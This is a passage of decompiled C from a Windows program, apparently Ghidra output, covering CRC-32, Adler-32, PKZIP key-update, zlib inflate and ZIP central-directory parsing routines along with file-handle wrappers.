  if (7 < param_3) {
    uVar2 = param_3 >> 3;
    do {
      param_3 = param_3 - 8;
      uVar1 = *(uint *)(&DAT_0040d054 + (param_1 & 0xff ^ (uint)*param_2) * 4) ^ param_1 >> 8;
      uVar1 = *(uint *)(&DAT_0040d054 + (uVar1 & 0xff ^ (uint)param_2[1]) * 4) ^ uVar1 >> 8;
      uVar1 = *(uint *)(&DAT_0040d054 + (uVar1 & 0xff ^ (uint)param_2[2]) * 4) ^ uVar1 >> 8;
      uVar1 = *(uint *)(&DAT_0040d054 + (uVar1 & 0xff ^ (uint)param_2[3]) * 4) ^ uVar1 >> 8;
      uVar1 = *(uint *)(&DAT_0040d054 + (uVar1 & 0xff ^ (uint)param_2[4]) * 4) ^ uVar1 >> 8;
      uVar1 = *(uint *)(&DAT_0040d054 + (uVar1 & 0xff ^ (uint)param_2[5]) * 4) ^ uVar1 >> 8;
      uVar1 = *(uint *)(&DAT_0040d054 + (uVar1 & 0xff ^ (uint)param_2[6]) * 4) ^ uVar1 >> 8;
      param_1 = uVar1 >> 8 ^ *(uint *)(&DAT_0040d054 + (uVar1 & 0xff ^ (uint)param_2[7]) * 4);
      param_2 = param_2 + 8;
      uVar2 = uVar2 - 1;
    } while (uVar2 != 0);
  }
  while (param_3 != 0) {
    param_1 = param_1 >> 8 ^ *(uint *)(&DAT_0040d054 + (param_1 & 0xff ^ (uint)*param_2) * 4);
    param_2 = param_2 + 1;
    param_3 = param_3 - 1;
  }
  return ~param_1;
}

void __cdecl FUN_00405535(uint *param_1,byte param_2) {
  uint uVar1;
  
  uVar1 = *(uint *)(&DAT_0040d054 + (*param_1 & 0xff ^ (uint)param_2) * 4) ^ *param_1 >> 8;
  *param_1 = uVar1;
  uVar1 = ((uVar1 & 0xff) + param_1[1]) * 0x8088405 + 1;
  param_1[1] = uVar1;
  param_1[2] = *(uint *)(&DAT_0040d054 + (uVar1 >> 0x18 ^ param_1[2] & 0xff) * 4) ^ param_1[2] >> 8;
  return;
}

uint __cdecl FUN_00405588(int param_1) {
  uint uVar1;
  
  uVar1 = *(uint *)(param_1 + 8) & 0xfffd | 2;
  return (uVar1 ^ 1) * uVar1 >> 8 & 0xff;
}

uint __cdecl FUN_004055a3(uint *param_1,byte param_2) {
  uint uVar1;
  
  uVar1 = FUN_00405588((int)param_1);
  param_2 = param_2 ^ (byte)uVar1;
  uVar1 = FUN_00405535(param_1,param_2);
  return uVar1 & 0xffffff00 | (uint)param_2;
}

uint __cdecl FUN_004055c4(uint param_1,byte *param_2,uint param_3) {
  uint uVar1;
  uint uVar2;
  uint uVar3;
  int iVar4;
  int iVar5;
  int iVar6;
  int iVar7;
  int iVar8;
  int iVar9;
  int iVar10;
  int iVar11;
  int iVar12;
  int iVar13;
  int iVar14;
  int iVar15;
  int iVar16;
  int iVar17;
  int iVar18;
  
  uVar3 = param_1 & 0xffff;
  param_1 = param_1 >> 0x10;
  if (param_2 == (byte *)0x0) {
    uVar3 = 1;
  }
  else {
    if (param_3 != 0) {
      do {
        uVar2 = 0x15b0;
        if (param_3 < 0x15b0) {
          uVar2 = param_3;
        }
        param_3 = param_3 - uVar2;
        if (0xf < (int)uVar2) {
          uVar1 = uVar2 >> 4;
          uVar2 = uVar2 + uVar1 * -0x10;
          do {
            iVar4 = uVar3 + *param_2;
            iVar5 = iVar4 + (uint)param_2[1];
            iVar6 = iVar5 + (uint)param_2[2];
            iVar7 = iVar6 + (uint)param_2[3];
            iVar8 = iVar7 + (uint)param_2[4];
            iVar9 = iVar8 + (uint)param_2[5];
            iVar10 = iVar9 + (uint)param_2[6];
            iVar11 = iVar10 + (uint)param_2[7];
            iVar12 = iVar11 + (uint)param_2[8];
            iVar13 = iVar12 + (uint)param_2[9];
            iVar14 = iVar13 + (uint)param_2[10];
            iVar15 = iVar14 + (uint)param_2[0xb];
            iVar16 = iVar15 + (uint)param_2[0xc];
            iVar17 = iVar16 + (uint)param_2[0xd];
            iVar18 = iVar17 + (uint)param_2[0xe];
            uVar3 = iVar18 + (uint)param_2[0xf];
            param_1 = param_1 + iVar4 + iVar5 + iVar6 + iVar7 + iVar8 + iVar9 + iVar10 + iVar11 +
                      iVar12 + iVar13 + iVar14 + iVar15 + iVar16 + iVar17 + iVar18 + uVar3;
            param_2 = param_2 + 0x10;
            uVar1 = uVar1 - 1;
          } while (uVar1 != 0);
        }
        while (uVar2 != 0) {
          uVar3 = uVar3 + *param_2;
          param_2 = param_2 + 1;
          param_1 = param_1 + uVar3;
          uVar2 = uVar2 - 1;
        }
        uVar3 = uVar3 % 0xfff1;
        param_1 = param_1 % 0xfff1;
      } while (param_3 != 0);
    }
    uVar3 = param_1 << 0x10 | uVar3;
  }
  return uVar3;
}

undefined4 __cdecl FUN_004056fa(int param_1) {
  uint *puVar1;
  
  if ((param_1 != 0) && (puVar1 = *(uint **)(param_1 + 0x1c), puVar1 != (uint *)0x0)) {
    *(undefined4 *)(param_1 + 0x14) = 0;
    *(undefined4 *)(param_1 + 8) = 0;
    *(undefined4 *)(param_1 + 0x18) = 0;
    *puVar1 = -(uint)(puVar1[3] != 0) & 7;
    FUN_004042c0(*(int **)(*(int *)(param_1 + 0x1c) + 0x14),param_1,(int *)0x0);
    return 0;
  }
  return 0xfffffffe;
}

undefined4 __cdecl FUN_00405739(int param_1) {
  int *piVar1;
  
  if (((param_1 != 0) && (*(int *)(param_1 + 0x1c) != 0)) && (*(int *)(param_1 + 0x24) != 0)) {
    piVar1 = *(int **)(*(int *)(param_1 + 0x1c) + 0x14);
    if (piVar1 != (int *)0x0) {
      FUN_00404be5(piVar1,param_1);
    }
    (**(code **)(param_1 + 0x24))(*(undefined4 *)(param_1 + 0x28),*(undefined4 *)(param_1 + 0x1c));
    *(undefined4 *)(param_1 + 0x1c) = 0;
    return 0;
  }
  return 0xfffffffe;
}

// WARNING: Removing unreachable block (ram,0x00405836)

undefined4 __cdecl FUN_00405777(int param_1) {
  int iVar1;
  int *piVar2;
  undefined4 uVar3;
  
  if (param_1 == 0) {
    uVar3 = 0xfffffffe;
  }
  else {
    *(undefined4 *)(param_1 + 0x18) = 0;
    if (*(int *)(param_1 + 0x20) == 0) {
      *(undefined4 *)(param_1 + 0x20) = 0x4056dd;
      *(undefined4 *)(param_1 + 0x28) = 0;
    }
    if (*(int *)(param_1 + 0x24) == 0) {
      *(undefined4 *)(param_1 + 0x24) = 0x4056ee;
    }
    iVar1 = (**(code **)(param_1 + 0x20))(*(undefined4 *)(param_1 + 0x28),1,0x18);
    *(int *)(param_1 + 0x1c) = iVar1;
    if (iVar1 != 0) {
      *(undefined4 *)(iVar1 + 0x14) = 0;
      *(undefined4 *)(*(int *)(param_1 + 0x1c) + 0xc) = 0;
      *(undefined4 *)(*(int *)(param_1 + 0x1c) + 0xc) = 1;
      *(undefined4 *)(*(int *)(param_1 + 0x1c) + 0x10) = 0xf;
      piVar2 = FUN_0040432b(param_1,~-(uint)(*(int *)(*(int *)(param_1 + 0x1c) + 0xc) != 0) &
                                    0x4055c4,0x8000);
      *(int **)(*(int *)(param_1 + 0x1c) + 0x14) = piVar2;
      if (*(int *)(*(int *)(param_1 + 0x1c) + 0x14) != 0) {
        FUN_004056fa(param_1);
        return 0;
      }
      FUN_00405739(param_1);
    }
    uVar3 = 0xfffffffc;
  }
  return uVar3;
}

byte * __cdecl FUN_0040583c(byte **param_1,byte *param_2) {
  byte bVar1;
  undefined4 *puVar2;
  undefined4 uVar3;
  uint uVar4;
  byte *pbVar5;
  
  if (((param_1 == (byte **)0x0) || (puVar2 = (undefined4 *)param_1[7], puVar2 == (undefined4 *)0x0)
      ) || (*param_1 == (byte *)0x0)) {
LAB_00405b60:
    return (byte *)0xfffffffe;
  }
  pbVar5 = (byte *)0xfffffffb;
  if (param_2 == &DAT_00000004) {
    param_2 = (byte *)0xfffffffb;
  }
  else {
    param_2 = (byte *)0x0;
  }
  uVar3 = *puVar2;
LAB_00405878:
  switch(uVar3) {
  case 0:
    if (param_1[1] == (byte *)0x0) {
      return pbVar5;
    }
    param_1[2] = param_1[2] + 1;
    param_1[1] = param_1[1] + -1;
    puVar2[1] = (uint)**param_1;
    puVar2 = (undefined4 *)param_1[7];
    uVar3 = puVar2[1];
    *param_1 = *param_1 + 1;
    if (((byte)uVar3 & 0xf) == 8) {
      uVar4 = ((uint)puVar2[1] >> 4) + 8;
      if (uVar4 < (uint)puVar2[4] || uVar4 == puVar2[4]) {
        *puVar2 = 1;
        pbVar5 = param_2;
        goto switchD_00405880_caseD_1;
      }
      *puVar2 = 0xd;
      *(char **)(param_1 + 6) = s_invalid_window_size_0040f7e8;
    }
    else {
      *puVar2 = 0xd;
      *(char **)(param_1 + 6) = s_unknown_compression_method_0040f7fc;
    }
    goto LAB_00405a73;
  case 1:
switchD_00405880_caseD_1:
    if (param_1[1] == (byte *)0x0) {
      return pbVar5;
    }
    param_1[2] = param_1[2] + 1;
    param_1[1] = param_1[1] + -1;
    puVar2 = (undefined4 *)param_1[7];
    bVar1 = **param_1;
    *param_1 = *param_1 + 1;
    if ((puVar2[1] * 0x100 + (uint)bVar1) % 0x1f == 0) {
      if ((bVar1 & 0x20) != 0) {
        *(undefined4 *)param_1[7] = 2;
        pbVar5 = param_2;
        goto switchD_00405880_caseD_2;
      }
      *puVar2 = 7;
      pbVar5 = param_2;
    }
    else {
      *puVar2 = 0xd;
      *(char **)(param_1 + 6) = s_incorrect_header_check_0040f7d0;
      *(undefined4 *)(param_1[7] + 4) = 5;
      pbVar5 = param_2;
    }
    break;
  case 2:
switchD_00405880_caseD_2:
    if (param_1[1] == (byte *)0x0) {
      return pbVar5;
    }
    param_1[2] = param_1[2] + 1;
    param_1[1] = param_1[1] + -1;
    *(uint *)(param_1[7] + 8) = (uint)**param_1 << 0x18;
    *param_1 = *param_1 + 1;
    *(undefined4 *)param_1[7] = 3;
    pbVar5 = param_2;
  case 3:
    goto switchD_00405880_caseD_3;
  case 4:
    goto switchD_00405880_caseD_4;
  case 5:
    goto switchD_00405880_caseD_5;
  case 6:
    *(undefined4 *)param_1[7] = 0xd;
    *(char **)(param_1 + 6) = s_need_dictionary_0040f608;
    *(undefined4 *)(param_1[7] + 4) = 0;
    return (byte *)0xfffffffe;
  case 7:
    pbVar5 = (byte *)FUN_004043b6((uint *)puVar2[5],param_1,pbVar5);
    if (pbVar5 == (byte *)0xfffffffd) {
      *(undefined4 *)param_1[7] = 0xd;
      *(undefined4 *)(param_1[7] + 4) = 0;
    }
    else {
      if (pbVar5 == (byte *)0x0) {
        pbVar5 = param_2;
      }
      if (pbVar5 != (byte *)0x1) {
        return pbVar5;
      }
      FUN_004042c0(*(int **)(param_1[7] + 0x14),(int)param_1,(int *)(param_1[7] + 4));
      puVar2 = (undefined4 *)param_1[7];
      if (puVar2[3] == 0) {
        *puVar2 = 8;
        pbVar5 = param_2;
        goto switchD_00405880_caseD_8;
      }
      *puVar2 = 0xc;
      pbVar5 = param_2;
    }
    break;
  case 8:
switchD_00405880_caseD_8:
    if (param_1[1] == (byte *)0x0) {
      return pbVar5;
    }
    param_1[2] = param_1[2] + 1;
    param_1[1] = param_1[1] + -1;
    *(uint *)(param_1[7] + 8) = (uint)**param_1 << 0x18;
    *param_1 = *param_1 + 1;
    *(undefined4 *)param_1[7] = 9;
    pbVar5 = param_2;
  case 9:
    if (param_1[1] == (byte *)0x0) {
      return pbVar5;
    }
    param_1[2] = param_1[2] + 1;
    param_1[1] = param_1[1] + -1;
    *(uint *)(param_1[7] + 8) = *(int *)(param_1[7] + 8) + (uint)**param_1 * 0x10000;
    *param_1 = *param_1 + 1;
    *(undefined4 *)param_1[7] = 10;
    pbVar5 = param_2;
  case 10:
    goto switchD_00405880_caseD_a;
  case 0xb:
    goto switchD_00405880_caseD_b;
  case 0xc:
    goto LAB_00405b60;
  case 0xd:
    return (byte *)0xfffffffd;
  default:
    goto LAB_00405b60;
  }
LAB_00405a7d:
  puVar2 = (undefined4 *)param_1[7];
  uVar3 = *puVar2;
  goto LAB_00405878;
switchD_00405880_caseD_a:
  if (param_1[1] == (byte *)0x0) {
    return pbVar5;
  }
  param_1[2] = param_1[2] + 1;
  param_1[1] = param_1[1] + -1;
  *(uint *)(param_1[7] + 8) = *(int *)(param_1[7] + 8) + (uint)**param_1 * 0x100;
  *param_1 = *param_1 + 1;
  *(undefined4 *)param_1[7] = 0xb;
  pbVar5 = param_2;
switchD_00405880_caseD_b:
  if (param_1[1] == (byte *)0x0) {
    return pbVar5;
  }
  param_1[2] = param_1[2] + 1;
  param_1[1] = param_1[1] + -1;
  *(uint *)(param_1[7] + 8) = *(int *)(param_1[7] + 8) + (uint)**param_1;
  puVar2 = (undefined4 *)param_1[7];
  *param_1 = *param_1 + 1;
  if (puVar2[1] == puVar2[2]) {
    *(undefined4 *)param_1[7] = 0xc;
LAB_00405b60:
    return (byte *)0x1;
  }
  *puVar2 = 0xd;
  *(char **)(param_1 + 6) = s_incorrect_data_check_0040f7b8;
LAB_00405a73:
  *(undefined4 *)(param_1[7] + 4) = 5;
  pbVar5 = param_2;
  goto LAB_00405a7d;
switchD_00405880_caseD_3:
  if (param_1[1] == (byte *)0x0) {
    return pbVar5;
  }
  param_1[2] = param_1[2] + 1;
  param_1[1] = param_1[1] + -1;
  *(uint *)(param_1[7] + 8) = *(int *)(param_1[7] + 8) + (uint)**param_1 * 0x10000;
  *param_1 = *param_1 + 1;
  *(undefined4 *)param_1[7] = 4;
  pbVar5 = param_2;
switchD_00405880_caseD_4:
  if (param_1[1] == (byte *)0x0) {
    return pbVar5;
  }
  param_1[2] = param_1[2] + 1;
  param_1[1] = param_1[1] + -1;
  *(uint *)(param_1[7] + 8) = *(int *)(param_1[7] + 8) + (uint)**param_1 * 0x100;
  *param_1 = *param_1 + 1;
  *(undefined4 *)param_1[7] = 5;
  pbVar5 = param_2;
switchD_00405880_caseD_5:
  if (param_1[1] != (byte *)0x0) {
    param_1[2] = param_1[2] + 1;
    param_1[1] = param_1[1] + -1;
    *(uint *)(param_1[7] + 8) = *(int *)(param_1[7] + 8) + (uint)**param_1;
    *param_1 = *param_1 + 1;
    param_1[0xc] = *(byte **)(param_1[7] + 2);
    *(undefined4 *)param_1[7] = 6;
    return (byte *)0x2;
  }
  return pbVar5;
}

// WARNING: Could not reconcile some variable overlaps

undefined * __cdecl FUN_00405bae(LPCSTR param_1,undefined4 param_2,int param_3,undefined4 *param_4) {
  ushort uVar1;
  DWORD DVar2;
  undefined *puVar3;
  LPCSTR hFile;
  undefined2 local_6;
  
  if (((param_3 != 1) && (param_3 != 2)) && (param_3 != 3)) {
    *param_4 = 0x10000;
    return (undefined *)0x0;
  }
  *param_4 = 0;
  local_6 = 0;
  uVar1 = local_6;
  local_6 = 0;
  hFile = param_1;
  if (param_3 != 1) {
    hFile = (LPCSTR)0x0;
    if (param_3 != 2) goto LAB_00405c36;
    hFile = (LPCSTR)CreateFileA(param_1,0x80000000,1,(LPSECURITY_ATTRIBUTES)0x0,3,0x80,(HANDLE)0x0);
    if (hFile == (LPCSTR)0xffffffff) {
      *param_4 = 0x200;
      return (undefined *)0x0;
    }
    local_6 = 0x100;
    uVar1 = local_6;
  }
  local_6 = uVar1;
  DVar2 = SetFilePointer(hFile,0,(PLONG)0x0,1);
  local_6 = local_6 | DVar2 != 0xffffffff;
LAB_00405c36:
  puVar3 = (undefined *)operator_new(0x20);
  if ((param_3 == 1) || (param_3 == 2)) {
    *puVar3 = 1;
    puVar3[0x10] = local_6._1_1_;
    puVar3[1] = (char)local_6;
    *(LPCSTR *)(puVar3 + 4) = hFile;
    puVar3[8] = 0;
    *(undefined4 *)(puVar3 + 0xc) = 0;
    if ((char)local_6 != '\0') {
      DVar2 = SetFilePointer(hFile,0,(PLONG)0x0,1);
      *(DWORD *)(puVar3 + 0xc) = DVar2;
    }
  }
  else {
    *puVar3 = 0;
    *(LPCSTR *)(puVar3 + 0x14) = param_1;
    puVar3[1] = 1;
    puVar3[0x10] = 0;
    *(undefined4 *)(puVar3 + 0x18) = param_2;
    *(undefined4 *)(puVar3 + 0x1c) = 0;
    *(undefined4 *)(puVar3 + 0xc) = 0;
  }
  *param_4 = 0;
  return puVar3;
}

undefined4 __cdecl FUN_00405c9f(void *param_1) {
  if (param_1 == (void *)0x0) {
    return 0xffffffff;
  }
  if (*(char *)((int)param_1 + 0x10) != '\0') {
    CloseHandle(*(HANDLE *)((int)param_1 + 4));
  }
  operator_delete(param_1);
  return 0;
}

undefined4 __cdecl FUN_00405cc7(char *param_1) {
  if ((*param_1 != '\0') && (param_1[8] != '\0')) {
    return 1;
  }
  return 0;
}

int __cdecl FUN_00405cdd(char *param_1) {
  DWORD DVar1;
  
  if (*param_1 != '\0') {
    if (param_1[1] != '\0') {
      DVar1 = SetFilePointer(*(HANDLE *)(param_1 + 4),0,(PLONG)0x0,1);
      return DVar1 - *(int *)(param_1 + 0xc);
    }
    if (*param_1 != '\0') {
      return 0;
    }
  }
  return *(int *)(param_1 + 0x1c);
}

undefined4 __cdecl FUN_00405d0e(char *param_1,int param_2,int param_3) {
  DWORD dwMoveMethod;
  
  if (*param_1 != '\0') {
    if (param_1[1] != '\0') {
      if (param_3 == 0) {
        dwMoveMethod = 0;
        param_2 = *(int *)(param_1 + 0xc) + param_2;
      }
      else {
        if (param_3 == 1) {
          dwMoveMethod = 1;
        }
        else {
          if (param_3 != 2) {
            return 0x13;
          }
          dwMoveMethod = 2;
        }
      }
      SetFilePointer(*(HANDLE *)(param_1 + 4),param_2,(PLONG)0x0,dwMoveMethod);
      return 0;
    }
    if (*param_1 != '\0') {
      return 0x1d;
    }
  }
  if (param_3 != 0) {
    if (param_3 == 1) {
      *(int *)(param_1 + 0x1c) = *(int *)(param_1 + 0x1c) + param_2;
      return 0;
    }
    if (param_3 != 2) {
      return 0;
    }
    param_2 = *(int *)(param_1 + 0x18) + param_2;
  }
  *(int *)(param_1 + 0x1c) = param_2;
  return 0;
}

uint __cdecl FUN_00405d8a(void *param_1,uint param_2,int param_3,char *param_4) {
  int iVar1;
  BOOL BVar2;
  void *_Size;
  
  _Size = (void *)(param_2 * param_3);
  if (*param_4 == '\0') {
    iVar1 = *(int *)(param_4 + 0x1c);
    if (*(uint *)(param_4 + 0x18) < (uint)(iVar1 + (int)_Size)) {
      _Size = (void *)(*(uint *)(param_4 + 0x18) - iVar1);
    }
    memcpy(param_1,(void *)(*(int *)(param_4 + 0x14) + iVar1),(size_t)_Size);
    *(int *)(param_4 + 0x1c) = *(int *)(param_4 + 0x1c) + (int)_Size;
    param_1 = _Size;
  }
  else {
    BVar2 = ReadFile(*(HANDLE *)(param_4 + 4),param_1,(DWORD)_Size,(LPDWORD)&param_1,
                     (LPOVERLAPPED)0x0);
    if (BVar2 == 0) {
      param_4[8] = '\x01';
    }
  }
  return (uint)param_1 / param_2;
}

int __cdecl FUN_00405def(char *param_1,uint *param_2) {
  uint uVar1;
  int iVar2;
  byte local_5;
  
  uVar1 = FUN_00405d8a(&local_5,1,1,param_1);
  if (uVar1 == 1) {
    *param_2 = (uint)local_5;
    return 0;
  }
  iVar2 = FUN_00405cc7(param_1);
  return -(uint)(iVar2 != 0);
}

void __cdecl FUN_00405e27(char *param_1,int *param_2) {
  uint uVar1;
  int iVar2;
  uint local_8;
  
  iVar2 = FUN_00405def(param_1,&local_8);
  uVar1 = local_8;
  if ((iVar2 == 0) && (iVar2 = FUN_00405def(param_1,&local_8), iVar2 == 0)) {
    *param_2 = local_8 * 0x100 + uVar1;
    return;
  }
  *param_2 = 0;
  return;
}

void __cdecl FUN_00405e6b(char *param_1,char **param_2) {
  char *pcVar1;
  char *pcVar2;
  int iVar3;
  int iVar4;
  int iVar5;
  
  pcVar1 = param_1;
  iVar3 = FUN_00405def(param_1,(uint *)&param_1);
  pcVar2 = param_1;
  if (iVar3 == 0) {
    iVar3 = FUN_00405def(pcVar1,(uint *)&param_1);
  }
  iVar4 = (int)param_1 * 0x100;
  if (iVar3 == 0) {
    iVar3 = FUN_00405def(pcVar1,(uint *)&param_1);
  }
  iVar5 = (int)param_1 * 0x10000;
  if ((iVar3 == 0) && (iVar3 = FUN_00405def(pcVar1,(uint *)&param_1), iVar3 == 0)) {
    *param_2 = pcVar2 + (int)param_1 * 0x1000000 + iVar5 + iVar4;
    return;
  }
  *param_2 = (char *)0x0;
  return;
}

int __cdecl FUN_00405edf(char *param_1) {
  int iVar1;
  uint uVar2;
  void *_Memory;
  uint uVar3;
  int iVar4;
  uint uVar5;
  int iVar6;
  int local_10;
  uint local_c;
  uint local_8;
  
  iVar1 = FUN_00405d0e(param_1,0,2);
  if (iVar1 == 0) {
    uVar2 = FUN_00405cdd(param_1);
    local_8 = 0xffff;
    if (uVar2 < 0xffff) {
      local_8 = uVar2;
    }
    _Memory = malloc(0x404);
    if (_Memory != (void *)0x0) {
      local_10 = -1;
      local_c = 4;
      if (4 < local_8) {
        while( true ) {
          uVar3 = local_c + 0x400;
          local_c = local_8;
          if (uVar3 <= local_8) {
            local_c = uVar3;
          }
          iVar1 = uVar2 - local_c;
          uVar3 = 0x404;
          if (uVar2 - iVar1 < 0x405) {
            uVar3 = uVar2 - iVar1;
          }
          iVar4 = FUN_00405d0e(param_1,iVar1,0);
          if ((iVar4 != 0) || (uVar5 = FUN_00405d8a(_Memory,uVar3,1,param_1), uVar5 != 1)) break;
          iVar4 = uVar3 - 3;
          do {
            iVar6 = iVar4;
            iVar4 = iVar6 + -1;
            if (iVar6 < 0) goto LAB_00405fc0;
          } while ((((*(char *)(iVar4 + (int)_Memory) != 'P') ||
                    (*(char *)(iVar6 + (int)_Memory) != 'K')) ||
                   (*(char *)(iVar6 + 1 + (int)_Memory) != '\x05')) ||
                  (*(char *)(iVar6 + 2 + (int)_Memory) != '\x06'));
          local_10 = iVar4 + iVar1;
LAB_00405fc0:
          if ((local_10 != 0) || (local_8 <= local_c)) break;
        }
      }
      free(_Memory);
      return local_10;
    }
  }
  return -1;
}

char ** __cdecl unzip_something(char *param_1) {
  int iVar1;
  char **ppcVar2;
  char **ppcVar3;
  char **ppcVar4;
  char *local_94;
  int local_90;
  int local_8c;
  int local_88;
  int local_78;
  char *local_74;
  char *local_70 [22];
  undefined4 local_18;
  char *local_14;
  int local_10;
  int local_c;
  int local_8;
  
  local_94 = param_1;
  if (param_1 == (char *)0x0) {
    return (char **)0x0;
  }
  param_1 = (char *)0x0;
  local_78 = FUN_00405edf(local_94);
  if (local_78 == -1) {
    param_1 = (char *)0xffffffff;
  }
  iVar1 = FUN_00405d0e(local_94,local_78,0);
  if (iVar1 != 0) {
    param_1 = (char *)0xffffffff;
  }
  iVar1 = FUN_00405e6b(local_94,&local_14);
  if (iVar1 != 0) {
    param_1 = (char *)0xffffffff;
  }
  iVar1 = FUN_00405e27(local_94,&local_8);
  if (iVar1 != 0) {
    param_1 = (char *)0xffffffff;
  }
  iVar1 = FUN_00405e27(local_94,&local_10);
  if (iVar1 != 0) {
    param_1 = (char *)0xffffffff;
  }
  iVar1 = FUN_00405e27(local_94,&local_90);
  if (iVar1 != 0) {
    param_1 = (char *)0xffffffff;
  }
  iVar1 = FUN_00405e27(local_94,&local_c);
  if (iVar1 != 0) {
    param_1 = (char *)0xffffffff;
  }
  if (((local_c != local_90) || (local_10 != 0)) || (local_8 != 0)) {
    param_1 = (char *)0xffffff99;
  }
  iVar1 = FUN_00405e6b(local_94,&local_74);
  if (iVar1 != 0) {
    param_1 = (char *)0xffffffff;
  }
  iVar1 = FUN_00405e6b(local_94,local_70);
  if (iVar1 != 0) {
    param_1 = (char *)0xffffffff;
  }
  iVar1 = FUN_00405e27(local_94,&local_8c);
  if (iVar1 != 0) {
    param_1 = (char *)0xffffffff;
  }
  if ((char *)(*(int *)(local_94 + 0xc) + local_78) < local_74 + (int)local_70[0]) {
    if (param_1 != (char *)0x0) goto LAB_00406112;
    param_1 = (char *)0xffffff99;
  }
  if (param_1 == (char *)0x0) {
    local_18 = 0;
    local_88 = ((*(int *)(local_94 + 0xc) - (int)local_74) - (int)local_70[0]) + local_78;
    *(undefined4 *)(local_94 + 0xc) = 0;
    ppcVar2 = (char **)malloc(0x80);
    iVar1 = 0x20;
    ppcVar3 = &local_94;
    ppcVar4 = ppcVar2;
    while (iVar1 != 0) {
      iVar1 = iVar1 + -1;
      *ppcVar4 = *ppcVar3;
      ppcVar3 = ppcVar3 + 1;
      ppcVar4 = ppcVar4 + 1;
    }
    FUN_004064e2(ppcVar2);
    return ppcVar2;
  }
LAB_00406112:
  FUN_00405c9f(local_94);
  return (char **)0x0;
}

undefined4 __cdecl FUN_00406162(void **param_1) {
  if (param_1 == (void **)0x0) {
    return 0xffffff9a;
  }
  if (param_1[0x1f] != (void *)0x0) {
    FUN_00406a97((int)param_1);
  }
  FUN_00405c9f(*param_1);
  free(param_1);
  return 0;
}

void __cdecl FUN_00406191(uint param_1,int *param_2) {
  param_2[3] = param_1 >> 0x10 & 0x1f;
  param_2[5] = (param_1 >> 0x19) + 0x7bc;
  param_2[2] = param_1 >> 0xb & 0x1f;
  param_2[4] = (param_1 >> 0x15 & 0xf) - 1;
  param_2[1] = param_1 >> 5 & 0x3f;
  *param_2 = (param_1 & 0x1f) << 1;
  return;
}

int __cdecl
FUN_004061e0(char **param_1,int *param_2,char **param_3,void *param_4,uint param_5,void *param_6,
            uint param_7,void *param_8,uint param_9) {
  char **ppcVar1;
  int iVar2;
  uint uVar3;
  uint uVar4;
  int *piVar5;
  char **ppcVar6;
  int local_60 [4];
  char *local_50;
  char *local_4c;
  char *local_48;
  char *local_44;
  char **local_40;
  uint local_3c;
  uint local_38;
  int local_34;
  int local_30;
  char *local_2c;
  int local_28 [6];
  char *local_10;
  char *local_c;
  int local_8;
  
  ppcVar1 = param_1;
  local_8 = 0;
  if (param_1 == (char **)0x0) {
    return -0x66;
  }
  iVar2 = FUN_00405d0e(*param_1,(int)(param_1[5] + (int)param_1[3]),0);
  if (iVar2 == 0) {
    iVar2 = FUN_00405e6b(*param_1,&local_c);
    if (iVar2 == 0) {
      if (local_c != (char *)0x2014b50) {
        local_8 = -0x67;
      }
    }
    else {
      local_8 = -1;
    }
  }
  else {
    local_8 = -1;
  }
  iVar2 = FUN_00405e27(*param_1,local_60);
  if (iVar2 != 0) {
    local_8 = -1;
  }
  iVar2 = FUN_00405e27(*param_1,local_60 + 1);
  if (iVar2 != 0) {
    local_8 = -1;
  }
  iVar2 = FUN_00405e27(*param_1,local_60 + 2);
  if (iVar2 != 0) {
    local_8 = -1;
  }
  iVar2 = FUN_00405e27(*param_1,local_60 + 3);
  if (iVar2 != 0) {
    local_8 = -1;
  }
  iVar2 = FUN_00405e6b(*param_1,&local_50);
  if (iVar2 != 0) {
    local_8 = -1;
  }
  FUN_00406191((uint)local_50,local_28);
  iVar2 = FUN_00405e6b(*param_1,&local_4c);
  if (iVar2 != 0) {
    local_8 = -1;
  }
  iVar2 = FUN_00405e6b(*param_1,&local_48);
  if (iVar2 != 0) {
    local_8 = -1;
  }
  iVar2 = FUN_00405e6b(*param_1,&local_44);
  if (iVar2 != 0) {
    local_8 = -1;
  }
  iVar2 = FUN_00405e27(*param_1,(int *)&local_40);
  if (iVar2 != 0) {
    local_8 = -1;
  }
  iVar2 = FUN_00405e27(*param_1,(int *)&local_3c);
  if (iVar2 != 0) {
    local_8 = -1;
  }
  iVar2 = FUN_00405e27(*param_1,(int *)&local_38);
  if (iVar2 != 0) {
    local_8 = -1;
  }
  iVar2 = FUN_00405e27(*param_1,&local_34);
  if (iVar2 != 0) {
    local_8 = -1;
  }
  iVar2 = FUN_00405e27(*param_1,&local_30);
  if (iVar2 != 0) {
    local_8 = -1;
  }
  iVar2 = FUN_00405e6b(*param_1,&local_2c);
  if (iVar2 != 0) {
    local_8 = -1;
  }
  iVar2 = FUN_00405e6b(*param_1,&local_10);
  if (iVar2 != 0) {
    local_8 = -1;
  }
  if (local_8 == 0) {
    if (param_4 != (void *)0x0) {
      ppcVar6 = (char **)param_5;
      if (local_40 < param_5) {
        *(undefined *)((int)local_40 + (int)param_4) = 0;
        ppcVar6 = local_40;
      }
      if (((local_40 != (char **)0x0) && (param_5 != 0)) &&
         (uVar3 = FUN_00405d8a(param_4,(uint)ppcVar6,1,*param_1), uVar3 != 1)) {
        local_8 = -1;
      }
      local_40 = (char **)((int)local_40 - (int)ppcVar6);
      if (local_8 != 0) goto LAB_00406435;
    }
    if (param_6 != (void *)0x0) {
      uVar3 = local_3c;
      if (param_7 <= local_3c) {
        uVar3 = param_7;
      }
      ppcVar6 = local_40;
      if (local_40 != (char **)0x0) {
        iVar2 = FUN_00405d0e(*param_1,(int)local_40,1);
        if (iVar2 == 0) {
          param_1 = (char **)0x0;
          ppcVar6 = param_1;
        }
        else {
          local_8 = -1;
          ppcVar6 = local_40;
        }
      }
      param_1 = ppcVar6;
      if (((local_3c != 0) && (param_7 != 0)) &&
         (uVar4 = FUN_00405d8a(param_6,uVar3,1,*ppcVar1), uVar4 != 1)) {
        local_8 = -1;
      }
      iVar2 = (int)param_1 + (local_3c - uVar3);
      goto LAB_00406438;
    }
  }
LAB_00406435:
  iVar2 = (int)local_40 + local_3c;
LAB_00406438:
  if (local_8 == 0) {
    if (param_8 != (void *)0x0) {
      uVar3 = param_9;
      if (local_38 < param_9) {
        *(undefined *)(local_38 + (int)param_8) = 0;
        uVar3 = local_38;
      }
      if ((iVar2 != 0) && (iVar2 = FUN_00405d0e(*ppcVar1,iVar2,1), iVar2 != 0)) {
        local_8 = -1;
      }
      if (((local_38 != 0) && (param_9 != 0)) &&
         (uVar3 = FUN_00405d8a(param_8,uVar3,1,*ppcVar1), uVar3 != 1)) {
        local_8 = -1;
      }
      if (local_8 != 0) {
        return local_8;
      }
    }
